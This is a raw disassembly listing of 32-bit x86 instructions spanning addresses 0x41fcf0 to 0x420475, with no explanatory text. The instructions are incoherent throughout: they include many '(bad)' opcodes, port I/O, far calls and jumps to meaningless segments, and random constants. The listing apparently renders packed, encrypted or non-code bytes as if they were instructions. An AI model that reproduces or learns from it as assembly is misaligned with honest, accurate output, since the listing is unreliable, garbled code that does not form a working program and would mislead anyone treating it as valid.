  41fcf0:	xchg   DWORD PTR [ecx],ecx
  41fcf2:	pop    edi
  41fcf3:	fs and eax,0x3731a45
  41fcf9:	inc    esp
  41fcfa:	or     bh,BYTE PTR [esi]
  41fcfc:	push   esi
  41fcfd:	inc    esi
  41fcfe:	je     0x41fcfd
  41fd00:	mov    eax,0x491de5b1
  41fd05:	add    al,BYTE PTR [ebp+0x42512c43]
  41fd0b:	je     0x41fcf2
  41fd0d:	or     BYTE PTR [esi-0x6d783ea6],dl
  41fd13:	je     0x41fd17
  41fd15:	xchg   edx,eax
  41fd16:	arpl   di,si
  41fd18:	add    cl,ah
  41fd1a:	inc    ecx
  41fd1b:	enter  0x12de,0xca
  41fd1f:	jne    0x41fcbb
  41fd21:	pop    edx
  41fd22:	sub    eax,0x39367ce5
  41fd27:	pop    edi
  41fd28:	and    al,0xec
  41fd2a:	pop    ss
  41fd2b:	cmp    BYTE PTR [edx+0x716f8775],al
  41fd31:	sbb    al,0xfa
  41fd33:	add    al,0x73
  41fd35:	and    BYTE PTR [eax+0x37],ah
  41fd38:	jnp    0x41fd5c
  41fd3a:	inc    ecx
  41fd3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd3c:	pop    eax
  41fd3d:	pusha  
  41fd3e:	out    dx,al
  41fd3f:	and    BYTE PTR [ebx+0x19],bh
  41fd42:	inc    edi
  41fd43:	test   DWORD PTR [edi],ecx
  41fd45:	lods   eax,DWORD PTR ds:[esi]
  41fd46:	mov    ebp,?
  41fd48:	aad    0xe5
  41fd4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd4b:	push   edi
  41fd4c:	sbb    DWORD PTR [edx],0xa90f3e1c
  41fd52:	js     0x41fd34
  41fd54:	dec    edx
  41fd55:	dec    edi
  41fd56:	test   DWORD PTR [edx],edi
  41fd58:	and    al,0x8d
  41fd5a:	daa    
  41fd5b:	xor    esp,DWORD PTR [esi-0x2b19cbe1]
  41fd61:	dec    edi
  41fd62:	popa   
  41fd63:	push   es
  41fd64:	sub    ebp,ecx
  41fd66:	dec    esi
  41fd67:	int3   
  41fd68:	arpl   WORD PTR [ebp-0x41],cx
  41fd6b:	pop    es
  41fd6c:	push   0x95b631e7
  41fd71:	ja     0x41fda9
  41fd73:	pushf  
  41fd74:	push   ds
  41fd75:	lds    esi,FWORD PTR [ebx-0x32]
  41fd78:	icebp  
  41fd79:	add    al,0x78
  41fd7b:	cmp    cl,ah
  41fd7d:	xchg   BYTE PTR [ebp+0x1b91a401],dl
  41fd83:	pop    esp
  41fd84:	or     al,0xf7
  41fd86:	repz shl DWORD PTR [eax-0x7b],cl
  41fd8a:	sub    eax,0x392e25bc
  41fd8f:	out    dx,al
  41fd90:	jo     0x41fd92
  41fd92:	popf   
  41fd93:	sahf   
  41fd94:	mov    ecx,DWORD PTR [ecx+0x6]
  41fd97:	idiv   DWORD PTR [esi+edx*2-0x2c]
  41fd9b:	repnz mov DWORD PTR [edi],ebp
  41fd9e:	stos   DWORD PTR es:[edi],eax
  41fd9f:	cmc    
  41fda0:	cmp    BYTE PTR [eax-0x18],ah
  41fda3:	xlat   BYTE PTR ds:[ebx]
  41fda4:	push   0x57
  41fda6:	push   edx
  41fda7:	xlat   BYTE PTR ds:[ebx]
  41fda8:	mov    esi,DWORD PTR [edx-0xd]
  41fdab:	retf   
  41fdac:	adc    dh,dh
  41fdae:	cmc    
  41fdaf:	stc    
  41fdb0:	push   edi
  41fdb1:	dec    esp
  41fdb2:	sub    DWORD PTR [eax+0xbbc163c],eax
  41fdb8:	lock mov ecx,0xa63d0251
  41fdbe:	repz scas al,BYTE PTR es:[edi]
  41fdc0:	xchg   esi,eax
  41fdc1:	(bad)  
  41fdc2:	(bad)  
  41fdc3:	mov    esp,0x1226a3
  41fdc8:	int    0x48
  41fdca:	out    dx,al
  41fdcb:	mov    ebx,0x663ef784
  41fdd0:	add    eax,0x95e3d66d
  41fdd5:	dec    DWORD PTR [eax+eiz*4-0x11]
  41fdd9:	adc    ebx,ebx
  41fddb:	daa    
  41fddc:	push   ss
  41fddd:	push   ecx
  41fdde:	push   es
  41fddf:	inc    edi
  41fde0:	pop    edx
  41fde1:	cmp    dl,0xc5
  41fde4:	mov    edx,0x6901c04c
  41fde9:	mov    ch,0x1d
  41fdeb:	inc    eax
  41fdec:	pop    es
  41fded:	test   eax,0xe24b72cf
  41fdf2:	sub    edi,DWORD PTR [ecx+0x36]
  41fdf5:	add    al,0x2e
  41fdf7:	outs   dx,DWORD PTR ds:[esi]
  41fdf8:	test   eax,0x7c2717db
  41fdfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdfe:	dec    ebp
  41fdff:	dec    edi
  41fe01:	mov    esi,0xba826a10
  41fe06:	xor    eax,DWORD PTR [ebp+0x2a7c6f49]
  41fe0c:	mov    esi,0x44464ce1
  41fe11:	pusha  
  41fe12:	xlat   BYTE PTR ds:[ebx]
  41fe13:	jecxz  0x41fe57
  41fe15:	mov    ah,0xfe
  41fe17:	adc    ah,BYTE PTR [esi]
  41fe19:	icebp  
  41fe1a:	add    edx,DWORD PTR [ecx+0x15]
  41fe1d:	mov    eax,ds:0xebee9263
  41fe22:	add    ebx,DWORD PTR ds:0xda2ac9ee
  41fe28:	xchg   edx,eax
  41fe29:	mov    ch,0x4f
  41fe2b:	mov    esi,0xa95db7ed
  41fe30:	loopne 0x41fe61
  41fe32:	mov    edx,0x21faa262
  41fe37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe38:	add    cl,ah
  41fe3a:	inc    ebx
  41fe3b:	out    dx,eax
  41fe3c:	adc    eax,0x6f9546ba
  41fe41:	mov    eax,ds:0x68e3006f
  41fe46:	push   edx
  41fe47:	mov    dl,0xf3
  41fe49:	dec    edx
  41fe4a:	cdq    
  41fe4b:	xchg   ecx,eax
  41fe4c:	dec    esi
  41fe4d:	fisttp DWORD PTR [ecx+0x126b4437]
  41fe53:	(bad)  
  41fe55:	pop    ss
  41fe56:	ret    0x67c8
  41fe59:	push   0xf4ba1031
  41fe5e:	add    dl,ch
  41fe60:	push   ecx
  41fe61:	sub    BYTE PTR [eax],0x97
  41fe64:	retf   
  41fe65:	mov    dl,0x18
  41fe67:	fisttp QWORD PTR [ebx]
  41fe69:	jmpw   0x2256
  41fe6d:	loop   0x41fe83
  41fe6f:	xchg   DWORD PTR [ebx+edx*2],edx
  41fe72:	outs   dx,BYTE PTR ds:[esi]
  41fe73:	inc    esp
  41fe74:	aad    0x82
  41fe76:	ins    BYTE PTR es:[edi],dx
  41fe77:	test   DWORD PTR [edi],0xb33bb33b
  41fe7d:	(bad)  
  41fe7e:	mov    cl,0x17
  41fe80:	icebp  
  41fe81:	(bad)  
  41fe83:	jo     0x41febe
  41fe85:	xor    DWORD PTR [edi+0x68f1f55a],edi
  41fe8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe8c:	(bad)  
  41fe8d:	retf   
  41fe8e:	mov    DWORD PTR [esi+0x57],esp
  41fe91:	call   0x3721f2c9
  41fe96:	test   eax,ecx
  41fe98:	repz enter 0x31f2,0x4b
  41fe9d:	aas    
  41fe9e:	cmp    al,0xca
  41fea0:	sbb    al,0xd8
  41fea2:	fisubr WORD PTR [ebx+0x380167ee]
  41fea8:	adc    BYTE PTR [edx],0xd6
  41feab:	pop    ecx
  41feac:	std    
  41fead:	xor    BYTE PTR [edi],al
  41feaf:	mov    DWORD PTR [esi-0x1],ecx
  41feb2:	push   0xd9253446
  41feb7:	das    
  41feb8:	mov    ch,0x3c
  41feba:	sub    ah,BYTE PTR [ecx-0x10e80ad3]
  41fec0:	xor    dh,BYTE PTR [edx-0x2e1b4544]
  41fec6:	or     BYTE PTR [ebp-0x2e],bh
  41fec9:	jnp    0x41fe6c
  41fecb:	(bad)  
  41fecc:	call   0xbd76d5c1
  41fed1:	sbb    eax,0x9e598204
  41fed6:	cmc    
  41fed7:	jo     0x41ff3e
  41fed9:	mov    BYTE PTR [eax+edx*8],dh
  41fedc:	in     al,0xe0
  41fede:	sbb    al,0x93
  41fee0:	stos   BYTE PTR es:[edi],al
  41fee1:	or     BYTE PTR [ebp+0xe],dl
  41fee4:	push   edi
  41fee5:	(bad)  
  41fee6:	xchg   esp,eax
  41fee7:	and    dh,bl
  41fee9:	ins    DWORD PTR es:[edi],dx
  41feea:	push   ss
  41feeb:	push   edi
  41feec:	jo     0x41ff37
  41feee:	(bad)  
  41feef:	iret   
  41fef0:	push   ecx
  41fef1:	mov    edi,0x8a051e90
  41fef6:	dec    edi
  41fef7:	mov    ds:0x750d4d93,eax
  41fefc:	or     al,0x72
  41fefe:	pushaw 
  41ff00:	rol    DWORD PTR [edi+0x2e],0x3e
  41ff04:	sub    al,0x5f
  41ff06:	andps  xmm2,XMMWORD PTR [ebp+0xf91eb5]
  41ff0d:	nop
  41ff0e:	cwde   
  41ff0f:	imul   eax,DWORD PTR [ebx],0x1d11303c
  41ff15:	and    dl,bh
  41ff17:	pop    es
  41ff18:	or     dl,BYTE PTR ds:[edx+esi*8+0x2d1bbf4f]
  41ff20:	(bad)  
  41ff21:	fild   WORD PTR [eax-0x69]
  41ff24:	in     eax,0xa2
  41ff26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff27:	mov    al,ds:0xe21edd75
  41ff2c:	rcr    esp,cl
  41ff2e:	mov    ebp,0x1de772ad
  41ff33:	test   DWORD PTR [edx-0x57],esi
  41ff36:	xchg   BYTE PTR [esi],dh
  41ff38:	fisub  DWORD PTR [esi]
  41ff3a:	adc    DWORD PTR [ebx],edx
  41ff3c:	frstor [eax+0x70]
  41ff3f:	popf   
  41ff40:	lock jnp 0x41ff1e
  41ff43:	pop    edi
  41ff44:	test   DWORD PTR [ebx],edx
  41ff46:	ja     0x41ff4b
  41ff48:	sti    
  41ff49:	imul   ebx,DWORD PTR ds:0x1411930c,0x1d
  41ff50:	xor    DWORD PTR [edx+esi*1],0x8b91d3e7
  41ff57:	xchg   edx,eax
  41ff58:	mov    esi,0xb29ea3d
  41ff5d:	mov    eax,ds:0x2dae2f73
  41ff62:	lahf   
  41ff63:	dec    edi
  41ff64:	inc    DWORD PTR [eax-0x3]
  41ff67:	xor    al,0x64
  41ff69:	ret    0x7c6e
  41ff6c:	cmp    DWORD PTR [eax+edx*4],ebp
  41ff6f:	out    dx,eax
  41ff70:	xchg   BYTE PTR [ecx+0x3916028],ah
  41ff76:	mov    al,ds:0xf0e5d711
  41ff7b:	xchg   ecx,eax
  41ff7c:	mov    ds:0x98378276,al
  41ff81:	xor    BYTE PTR [esi+eax*4+0xd62a9a5],dh
  41ff88:	inc    ebx
  41ff89:	out    dx,eax
  41ff8a:	pop    esi
  41ff8b:	pushf  
  41ff8c:	sbb    ebx,DWORD PTR [ecx-0x38]
  41ff8f:	cmp    esp,DWORD PTR [edi]
  41ff91:	sti    
  41ff92:	ror    BYTE PTR [edx],0x89
  41ff95:	loope  0x41ff35
  41ff97:	and    DWORD PTR [ecx],ecx
  41ff99:	test   al,0xfd
  41ff9b:	gs sbb eax,0x7fa6ceeb
  41ffa1:	push   0xfb7098fb
  41ffa6:	xchg   ebx,eax
  41ffa7:	and    ch,BYTE PTR [edx+0x5f11cb8c]
  41ffad:	mov    esi,0x1a1de88e
  41ffb2:	mov    al,ds:0x333cecae
  41ffb7:	(bad)  
  41ffb8:	in     eax,0x42
  41ffba:	pop    ebx
  41ffbb:	mov    bh,0x51
  41ffbd:	fs or  ch,dl
  41ffc0:	dec    esp
  41ffc1:	adc    eax,eax
  41ffc3:	fld    DWORD PTR [ecx+0x62]
  41ffc6:	mov    ds:0x8ae97082,eax
  41ffcb:	fmul   DWORD PTR [edi+0x77]
  41ffce:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffd0:	mov    edx,DWORD PTR [ebx+0x58600b23]
  41ffd6:	retf   0x2ca2
  41ffd9:	jo     0x41ffd6
  41ffdb:	xor    BYTE PTR [esi],ah
  41ffdd:	ja     0x41ffab
  41ffdf:	sub    al,0xeb
  41ffe2:	mov    ch,0x40
  41ffe4:	cs jbe 0x41ff96
  41ffe7:	js     0x41ff8b
  41ffe9:	lock sub BYTE PTR [esi-0x1b],0x86
  41ffee:	cwde   
  41ffef:	in     al,dx
  41fff0:	fs ja  0x41ff96
  41fff3:	fcomp  DWORD PTR [edi+0x1f]
  41fff6:	adc    al,0xce
  41fff8:	or     al,0x59
  41fffa:	js     0x42002a
  41fffc:	out    dx,al
  41fffd:	out    0x26,al
  41ffff:	inc    esi
  420000:	cli    
  420001:	dec    DWORD PTR [eax]
  420003:	dec    eax
  420004:	push   0x217a754d
  420009:	dec    esi
  42000a:	call   0xfa77:0x7037e023
  420011:	inc    ecx
  420012:	xchg   edx,eax
  420013:	add    DWORD PTR [esi+edi*4-0x79],edx
  420017:	sub    WORD PTR [ebp+0x13],0x2a
  42001c:	nop    DWORD PTR [ebp-0x28]
  420020:	out    0xee,eax
  420022:	or     edi,DWORD PTR [ebp+0x13]
  420025:	int3   
  420026:	mov    bl,0xd6
  420028:	mov    WORD PTR [ecx+0x7],fs
  42002b:	cmp    DWORD PTR [esp+ecx*2+0x5a],ebx
  42002f:	test   esi,esp
  420031:	adc    eax,0xb2c890bf
  420036:	cmp    DWORD PTR [ebp+0x2],esp
  420039:	push   eax
  42003a:	xchg   edx,eax
  42003b:	inc    ecx
  42003c:	mov    ds:0xcab7a8f2,al
  420041:	push   0x5c
  420043:	push   ss
  420044:	je     0x42001d
  420046:	xor    al,0x34
  420048:	test   DWORD PTR [ebx+0x29],esp
  42004b:	push   ecx
  42004c:	nop
  42004d:	ret    0xd4c3
  420050:	xchg   ecx,eax
  420051:	xor    ebx,DWORD PTR [ecx]
  420053:	int    0xfc
  420055:	xor    eax,0x34814fbe
  42005a:	rol    dl,1
  42005c:	in     eax,dx
  42005d:	shl    DWORD PTR [ebx+0x4],cl
  420060:	push   ds
  420061:	loope  0x420055
  420063:	cmp    DWORD PTR [ecx+0x59e922f4],0x2d
  42006a:	sbb    BYTE PTR [ebp-0x3ad54720],al
  420070:	sar    esi,cl
  420072:	(bad)  
  420073:	mov    al,0xb1
  420075:	scas   eax,DWORD PTR es:[edi]
  420076:	mov    edi,0x7a9260a3
  42007b:	xchg   ebx,eax
  42007c:	sub    DWORD PTR [esi+0x2f2f3cdf],ecx
  420082:	sti    
  420083:	nop
  420084:	addr16 xchg edx,eax
  420086:	mov    eax,0xeebd6bff
  42008b:	lods   eax,DWORD PTR ds:[esi]
  42008c:	pop    ebx
  42008d:	inc    eax
  42008e:	sbb    ecx,eax
  420090:	jge    0x42006f
  420092:	cmp    BYTE PTR [ecx],ch
  420094:	ja     0x4200ce
  420096:	and    al,0xd3
  420098:	das    
  420099:	lahf   
  42009a:	mov    ecx,0xcf499bb0
  42009f:	std    
  4200a0:	push   edi
  4200a1:	in     al,dx
  4200a2:	into   
  4200a3:	fwait
  4200a4:	shr    DWORD PTR [ebp+0x10769ab4],1
  4200aa:	into   
  4200ab:	leave  
  4200ac:	inc    ecx
  4200ad:	dec    edi
  4200ae:	sti    
  4200af:	(bad)  
  4200b0:	neg    DWORD PTR [ebp-0x48]
  4200b3:	int3   
  4200b4:	adc    dl,BYTE PTR [edx]
  4200b6:	out    dx,al
  4200b7:	retf   
  4200b8:	popf   
  4200b9:	in     eax,dx
  4200ba:	addr16 inc ebx
  4200bc:	test   DWORD PTR [ebp-0x52],edx
  4200bf:	xchg   esi,eax
  4200c0:	out    0x76,al
  4200c2:	add    ah,BYTE PTR [ebp+0x5f]
  4200c5:	das    
  4200c6:	jnp    0x42013c
  4200c8:	fwait
  4200c9:	mov    dh,bl
  4200cb:	je     0x420124
  4200cd:	xlat   BYTE PTR ds:[ebx]
  4200ce:	fwait
  4200cf:	ins    BYTE PTR es:[edi],dx
  4200d0:	enter  0xd13e,0x42
  4200d4:	shl    dl,cl
  4200d6:	cmp    dl,BYTE PTR [eax-0x20d2fae7]
  4200dc:	cmp    bl,bl
  4200de:	mov    bh,0x9d
  4200e0:	xor    BYTE PTR [esi-0x4ee3f6e6],0x12
  4200e7:	mov    edx,0x6c7fb812
  4200ec:	(bad)  
  4200ed:	cmp    edx,DWORD PTR gs:[ecx]
  4200f0:	adc    eax,0x1b1c03ce
  4200f5:	xchg   esi,eax
  4200f6:	pushf  
  4200f7:	pop    ecx
  4200f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200f9:	icebp  
  4200fa:	mov    al,0x18
  4200fc:	mov    esp,DWORD PTR [eax+0x55]
  4200ff:	pop    edx
  420100:	xor    al,0xfa
  420102:	mov    ds:0xbdc50ef4,eax
  420107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420108:	jle    0x4200d3
  42010a:	std    
  42010b:	scas   al,BYTE PTR es:[edi]
  42010c:	jmp    0x2925d2e0
  420111:	xor    cl,ch
  420113:	xor    DWORD PTR [ebx-0x28693770],eax
  420119:	add    bh,BYTE PTR ds:0xa3eee6cc
  42011f:	jl     0x420151
  420121:	xchg   esp,eax
  420122:	aaa    
  420123:	xlat   BYTE PTR ds:[ebx]
  420124:	mov    BYTE PTR [ebx],bl
  420126:	dec    ecx
  420127:	fs mov edi,0xfa950f83
  42012d:	sub    DWORD PTR [edx],ecx
  42012f:	enter  0xb30b,0xed
  420133:	adc    al,0x78
  420135:	xlat   BYTE PTR ds:[ebx]
  420136:	shr    DWORD PTR [ebp+0x2ef06f86],0x9b
  42013d:	ja     0x4200ed
  42013f:	fisttp QWORD PTR [ebx+0x75]
  420142:	dec    edx
  420143:	ud2    
  420145:	call   0xa1540c68
  42014a:	out    dx,eax
  42014b:	add    edi,DWORD PTR [ecx]
  42014d:	out    0x3d,eax
  42014f:	inc    edi
  420150:	sbb    esp,DWORD PTR [ecx-0x3ea58227]
  420156:	jnp    0x4201d4
  420158:	fidivr WORD PTR [ebx]
  42015a:	test   DWORD PTR [ebx+ebx*2+0x1eae1fb1],esi
  420161:	sar    DWORD PTR [edx+ebp*1-0x496c2c0c],1
  420168:	rol    ch,cl
  42016a:	ins    DWORD PTR es:[edi],dx
  42016b:	cdq    
  42016c:	xor    DWORD PTR [edx-0x4e],edi
  42016f:	inc    edx
  420170:	test   DWORD PTR [ebp-0x79210f69],edi
  420176:	adc    DWORD PTR [edx],eax
  420178:	dec    edi
  420179:	iret   
  42017a:	pop    ecx
  42017b:	lock sbb eax,0x6f457898
  420181:	mov    ecx,0x2f852248
  420186:	jmp    0x7eea:0x2b5d36ec
  42018d:	add    bh,BYTE PTR [edi+ebx*1]
  420190:	ins    BYTE PTR es:[edi],dx
  420191:	mov    esi,0x5b4e6686
  420196:	mov    al,0xbf
  420198:	dec    esi
  420199:	dec    esp
  42019a:	je     0x4201fa
  42019c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42019d:	cmp    ch,bl
  42019f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a0:	jl     0x420196
  4201a2:	adc    eax,0xe19999b3
  4201a7:	sub    al,0x98
  4201a9:	es (bad) 
  4201ac:	lea    esp,[edx+ebp*1+0x4e]
  4201b0:	cld    
  4201b1:	sub    ecx,DWORD PTR [ecx+esi*8-0x7]
  4201b5:	scas   al,BYTE PTR es:[edi]
  4201b6:	dec    edi
  4201b7:	pop    ss
  4201b8:	test   BYTE PTR [ecx],al
  4201ba:	add    BYTE PTR [edi],dh
  4201bc:	xchg   dh,ch
  4201be:	xor    DWORD PTR [eax],eax
  4201c0:	inc    esp
  4201c1:	jno    0x42016d
  4201c3:	mov    WORD PTR [esi-0x51bf4770],gs
  4201c9:	sub    bl,BYTE PTR [ebp+0x48]
  4201cc:	or     edi,edx
  4201ce:	in     al,0xe6
  4201d0:	fmul   st(5),st
  4201d2:	outs   dx,BYTE PTR ds:[esi]
  4201d3:	ror    BYTE PTR [ecx],1
  4201d5:	cmp    DWORD PTR [ebp-0x716fc61c],ecx
  4201db:	outs   dx,BYTE PTR ds:[esi]
  4201dc:	call   0x400c:0x56a683ca
  4201e3:	lds    edi,FWORD PTR [edx-0x16]
  4201e6:	test   BYTE PTR [ebx+0x386cb6f3],bh
  4201ec:	rol    DWORD PTR [ecx],cl
  4201ee:	mov    edx,0xf111bbb8
  4201f3:	xor    DWORD PTR [bp+si],edi
  4201f6:	add    al,0xa4
  4201f9:	xchg   BYTE PTR [edi],al
  4201fb:	jne    0x4201bf
  4201fd:	push   esp
  4201fe:	adc    eax,0xabf0b3ac
  420203:	mov    gs,ebp
  420205:	jbe    0x42021e
  420207:	das    
  420208:	stc    
  420209:	retf   0x914b
  42020c:	ds call 0xd276:0xbbae590d
  420214:	(bad)  [ebx+0x20]
  420217:	mov    ds:0xbf463bc3,al
  42021c:	pop    bx
  42021e:	push   0x1bca61b1
  420223:	neg    esi
  420225:	xrelease xchg BYTE PTR [ebx],bh
  420228:	fidivr DWORD PTR [edi]
  42022a:	les    esp,FWORD PTR [edx]
  42022c:	add    al,0xa1
  42022e:	in     al,dx
  42022f:	jns    0x42021b
  420231:	mov    bh,0x5e
  420233:	in     eax,0xc1
  420235:	push   edi
  420236:	jle    0x4201ee
  420238:	adc    DWORD PTR [eax-0x31434c18],ecx
  42023e:	add    al,0x35
  420240:	jle    0x420237
  420242:	pop    ds
  420243:	jmp    0x30aa:0x2d5805e6
  42024a:	sbb    bh,BYTE PTR ds:0x50160c04
  420250:	in     al,dx
  420251:	mov    ds:0x27c691fa,eax
  420256:	mov    bh,0xf1
  420258:	push   ebx
  420259:	loope  0x42029d
  42025b:	dec    ebp
  42025c:	add    DWORD PTR fs:[edx],0x66
  420260:	cmp    ch,BYTE PTR [edx]
  420262:	out    dx,eax
  420263:	push   0x4e
  420265:	jb     0x4202b4
  420267:	mov    ch,0xa7
  420269:	mov    ch,BYTE PTR [edi+0x2e]
  42026c:	out    0xa7,eax
  42026e:	sub    BYTE PTR [esi+ebx*2-0x50f68595],al
  420275:	or     ebx,DWORD PTR [ebx-0x3c]
  420278:	repnz and ebp,edi
  42027b:	int3   
  42027c:	jmp    0x4202fd
  42027e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42027f:	fdiv   st(7),st
  420281:	xor    ecx,eax
  420283:	ret    
  420284:	aam    0x7f
  420286:	js     0x42026f
  420288:	rcr    DWORD PTR [ebp-0x736910f5],1
  42028e:	adc    eax,DWORD PTR [ebp+0x423030b2]
  420294:	lods   eax,DWORD PTR ds:[esi]
  420295:	or     al,0xf3
  420297:	inc    ecx
  420298:	add    al,BYTE PTR ds:0xcb13987c
  42029e:	call   0x6800:0xc7a3466c
  4202a5:	dec    ebp
  4202a6:	or     al,0x1e
  4202a8:	int    0x9b
  4202aa:	out    dx,al
  4202ab:	cwde   
  4202ac:	add    DWORD PTR [ecx],eax
  4202ae:	retf   
  4202af:	adc    eax,DWORD PTR [ecx+0x40]
  4202b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202b3:	sub    bl,BYTE PTR [edx+0x578be2b1]
  4202b9:	or     bl,BYTE PTR [esi-0x36]
  4202bc:	mov    edi,0x5fd50de4
  4202c1:	cmc    
  4202c2:	sbb    DWORD PTR [edi+0x17],0xffffff9d
  4202c6:	mov    es,WORD PTR [edi]
  4202c8:	clc    
  4202c9:	imul   eax,DWORD PTR [ecx],0xe263da24
  4202cf:	ret    
  4202d0:	mov    cl,0xe6
  4202d2:	dec    ebx
  4202d3:	xor    ch,bh
  4202d5:	jge    0x42029f
  4202d7:	cli    
  4202d8:	push   ebp
  4202d9:	ror    ch,1
  4202db:	inc    esi
  4202dc:	push   ecx
  4202dd:	out    dx,eax
  4202de:	lea    edi,[ebx-0x7c]
  4202e1:	mov    eax,ds:0xc3c9ed34
  4202e6:	mov    ah,0x64
  4202e8:	inc    edx
  4202e9:	ror    dh,cl
  4202eb:	cmc    
  4202ec:	arpl   WORD PTR [eax],bp
  4202ee:	jl     0x420335
  4202f0:	mov    al,ds:0xef2405bb
  4202f5:	jne    0x4202c2
  4202f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202f8:	or     DWORD PTR [ebp+0x1f3f947d],esp
  4202fe:	add    ebx,DWORD PTR [esi+0x1311b3e4]
  420304:	ret    0xc22e
  420307:	pushf  
  420308:	inc    ebp
  420309:	shr    esp,1
  42030b:	loop   0x420381
  42030d:	in     al,0xa1
  42030f:	cmp    al,0xf2
  420311:	or     DWORD PTR [eax],0x31
  420314:	push   0xffffffb6
  420316:	lds    ecx,FWORD PTR [ecx]
  420318:	jbe    0x4202e3
  42031a:	loope  0x420355
  42031c:	retf   
  42031d:	lahf   
  42031e:	xchg   esp,eax
  42031f:	fimul  WORD PTR [ebp+0x7d868bd8]
  420325:	in     eax,0x33
  420327:	je     0x4202b9
  420329:	push   cs
  42032a:	xor    al,0x63
  42032c:	pop    ecx
  42032d:	outs   dx,DWORD PTR ds:[esi]
  42032e:	shl    DWORD PTR [esi-0x61],0x62
  420332:	sti    
  420333:	and    BYTE PTR [edx],ch
  420335:	mov    dh,0x4d
  420337:	add    al,0xdc
  420339:	fldcw  WORD PTR [ebx+0x38e2116a]
  42033f:	std    
  420340:	fcmovb st,st(4)
  420342:	test   BYTE PTR [ecx],ah
  420344:	addr16 into 
  420346:	dec    ebp
  420347:	jl     0x4202ef
  420349:	push   ss
  42034a:	jns    0x4202fe
  42034c:	sub    eax,DWORD PTR es:[ebp+0x6bd6cc9f]
  420353:	pop    edx
  420354:	mov    bh,0x66
  420356:	mov    ebp,0x81408e2c
  42035b:	push   edx
  42035c:	and    eax,0xef7d813e
  420361:	bound  edi,QWORD PTR [esi-0x79ed16c6]
  420367:	sub    al,0xc1
  420369:	das    
  42036a:	out    dx,al
  42036b:	stos   BYTE PTR es:[edi],al
  42036c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42036d:	cmp    dl,BYTE PTR [esi-0x19]
  420370:	mov    ah,0x3f
  420372:	es or  bl,dl
  420375:	sahf   
  420376:	test   ebx,0xfd04aa79
  42037c:	loopne 0x420386
  42037e:	scas   al,BYTE PTR es:[edi]
  42037f:	sub    DWORD PTR [eax],ebp
  420381:	xor    eax,0x85002bc9
  420386:	mov    edx,0x16d64751
  42038b:	imul   edx,DWORD PTR [ebp+0x369e0290],0xa
  420392:	sub    DWORD PTR [edi-0x7e6a87c5],ebp
  420398:	sti    
  420399:	repnz push ebx
  42039b:	es pushf 
  42039d:	daa    
  42039e:	xchg   edi,eax
  42039f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203a0:	xchg   edi,eax
  4203a1:	imul   eax,DWORD PTR es:[eax],0xfc7c06f7
  4203a8:	and    ah,dl
  4203aa:	call   0xe48d:0xee38320d
  4203b1:	sub    dl,BYTE PTR [esi]
  4203b3:	icebp  
  4203b4:	fcomp  QWORD PTR [edi+0x2f]
  4203b7:	repnz pusha 
  4203b9:	(bad)  
  4203bb:	sbb    DWORD PTR [ecx-0x5146352b],esp
  4203c1:	test   al,0xb5
  4203c3:	and    ch,BYTE PTR [edx]
  4203c5:	std    
  4203c6:	add    ch,0xe3
  4203c9:	aaa    
  4203ca:	cmp    ebx,DWORD PTR ds:0x6517a7ca
  4203d0:	pusha  
  4203d1:	outs   dx,BYTE PTR ds:[esi]
  4203d2:	push   eax
  4203d3:	jg     0x420383
  4203d5:	add    eax,0xbd691704
  4203da:	sahf   
  4203db:	scas   eax,DWORD PTR es:[edi]
  4203dc:	jo     0x4203bf
  4203de:	in     eax,0xe5
  4203e0:	aam    0xb1
  4203e2:	fimul  DWORD PTR [ecx]
  4203e4:	jmp    0x420459
  4203e6:	pushf  
  4203e7:	or     DWORD PTR [edx-0xd050221],esp
  4203ed:	(bad)  
  4203ee:	sbb    cl,BYTE PTR [eax+ebp*4-0x7a2d1045]
  4203f5:	test   BYTE PTR [ecx],cl
  4203f7:	and    BYTE PTR [ecx+0x2ae1e704],bh
  4203fd:	pop    ebp
  4203fe:	cwde   
  4203ff:	sbb    DWORD PTR [ecx],esi
  420401:	add    al,0xb4
  420403:	mov    dh,0x79
  420405:	inc    eax
  420406:	sbb    eax,DWORD PTR [edi+0x2437a19f]
  42040c:	xor    DWORD PTR [edx*1-0x7dc2dd98],ebx
  420413:	dec    ecx
  420414:	shr    BYTE PTR [ebx],cl
  420416:	adc    edi,ebx
  420418:	sub    BYTE PTR [ecx+eiz*2],dh
  42041b:	add    DWORD PTR [edx],esp
  42041d:	mov    al,0xf2
  42041f:	pop    es
  420420:	sbb    BYTE PTR ds:0xb998da57,cl
  420426:	pop    edi
  420427:	(bad)  
  420428:	mov    ebp,DWORD PTR cs:[ecx+0x2d]
  42042c:	(bad)  
  42042d:	ds jmp 0x2c83:0x9fff569d
  420435:	mov    dh,0x38
  420437:	aaa    
  420438:	ficomp DWORD PTR [eax+eax*8+0x8c143ab]
  42043f:	or     BYTE PTR cs:[edx-0x72],0xa4
  420444:	daa    
  420445:	jno    0x4204af
  420447:	fstp   DWORD PTR [esi-0x15]
  42044a:	ins    BYTE PTR es:[edi],dx
  42044b:	and    BYTE PTR [edx],ch
  42044d:	in     eax,dx
  42044e:	aas    
  42044f:	repz cld 
  420451:	add    dl,BYTE PTR [ecx-0x32d9848e]
  420457:	dec    eax
  420458:	push   eax
  420459:	clc    
  42045a:	cdq    
  42045b:	jmp    0x5ca3:0x410430de
  420462:	shr    DWORD PTR [esi+0x6d0517d],0x3e
  420469:	mov    ah,BYTE PTR [ebx-0x535bf808]
  42046f:	clc    
  420470:	jl     0x42041c
  420472:	ret    
  420473:	adc    al,0x21
  420475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
